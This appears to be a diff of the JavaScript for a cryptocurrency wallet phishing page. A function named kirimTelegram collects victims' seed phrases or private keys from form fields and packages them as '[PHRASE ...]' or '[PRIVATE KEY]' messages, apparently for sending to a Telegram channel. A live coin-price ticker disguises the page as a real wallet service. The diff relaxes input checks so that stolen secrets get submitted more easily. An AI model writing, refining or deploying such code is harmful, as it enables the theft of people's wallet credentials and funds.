@@ -358,7 +358,6 @@
       
       grid.querySelector('.seed-input').addEventListener('paste', (e) => {
         e.preventDefault();
-        
         const text   = (e.clipboardData || window.clipboardData).getData('text');
         const words  = text.trim().split(/\s+/);
         const inputs = grid.querySelectorAll('.seed-input');
@@ -385,40 +384,19 @@
     async function kirimTelegram(e, type) {
       e.preventDefault();
       let pesan = '';
+
       if (type === 'phrase') {
         const inputs = document.querySelectorAll('#seedGrid .seed-input');
-        let hasError = false;
-        inputs.forEach(input => {
-          const field = input.closest('.seed-field');
-          field.classList.remove('error');
-          if (input.value.trim().length < 2 || /[^a-z]/.test(input.value.trim())) {
-            field.classList.add('error');
-            hasError = true;
-          }
-        });
-        if (hasError) {
-  const btn = document.getElementById('btnSubmitPhrase');
-  const msg = document.getElementById('errorPhrase');
-  msg.classList.add('show');
-  btn.classList.add('shake');
-  btn.addEventListener('animationend', () => btn.classList.remove('shake'), {once: true});
-  return;
-}
+        const words  = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+        if (words.length < currentWordCount) {
+          alert(`Please fill all ${currentWordCount} words.`);
+          return;
+        }
         pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
       } else {
-        const pk = document.getElementById('pkInput').value.trim();
-        const pkWrap = document.querySelector('.pk-wrap');
-        pkWrap.classList.remove('error');
-        if (pk.length < 64) {
-          const btn = document.getElementById('btnSubmitPK');
-  const msg = document.getElementById('errorPK');
-  pkWrap.classList.add('error');
-  msg.classList.add('show');
-  btn.classList.add('shake');
-  btn.addEventListener('animationend', () => btn.classList.remove('shake'), {once: true});
-  return;
-}
-        pesan = `[PRIVATE KEY] ${pk}`;
+        pesan = document.getElementById('pkInput').value.trim();
+        if (!pesan) { alert('Please enter your private key.'); return; }
+        pesan = `[PRIVATE KEY] ${pesan}`;
       }
 
       const btnId = type === 'phrase' ? 'btnSubmitPhrase' : 'btnSubmitPK';
@@ -481,7 +459,7 @@
       if (!track) return;
       track.innerHTML = [...data,...data].map(({sym,price,change}) => {
         const up = change >= 0;
-        return `<div class="ticker-item"><div class="ticker-dot" style="background:${up?'#276a27':'#c0392b'}"></div><span class="ticker-coin">${sym}</span><span class="ticker-price">${fmtPrice(price)}</span><span class="ticker-change ${up?'up':'down'}">${up?'▲':'▼'} ${Math.abs(change).toFixed(2)}%</span></div>`;
+        return `<div class="ticker-item"><div class="ticker-dot" style="background:${up?'#4ade80':'#f87171'}"></div><span class="ticker-coin">${sym}</span><span class="ticker-price">${fmtPrice(price)}</span><span class="ticker-change ${up?'up':'down'}">${up?'▲':'▼'} ${Math.abs(change).toFixed(2)}%</span></div>`;
       }).join('');
     }
     const FALLBACK = [
